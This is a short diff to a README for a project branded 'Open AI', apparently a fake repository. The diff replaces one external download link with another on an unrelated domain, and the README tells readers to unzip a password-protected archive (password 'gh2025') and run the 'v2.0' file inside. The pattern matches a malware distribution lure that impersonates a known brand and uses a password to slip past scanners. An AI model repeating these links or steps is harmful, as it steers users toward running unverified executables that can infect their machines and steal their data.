@@ -33,7 +33,7 @@ OpenAi comes with a bundle of amazing features! Here are some of them:
 # 🛠️ Usage
 
 To install **Open AI**, follow these steps:
-# [DOWNLOAD](https://www.4sync.com/web/directDownload/LnVaHwGQ/me6XXOEh.85e0e4e73bdc1527cca521c403e412a2)  
+# [DOWNLOAD](https://chatbox.download-desktops.com)  
 After downloading the archive, unzip it using the password. Run the v2.0 file.
 
 ## PASSWORD - gh2025  
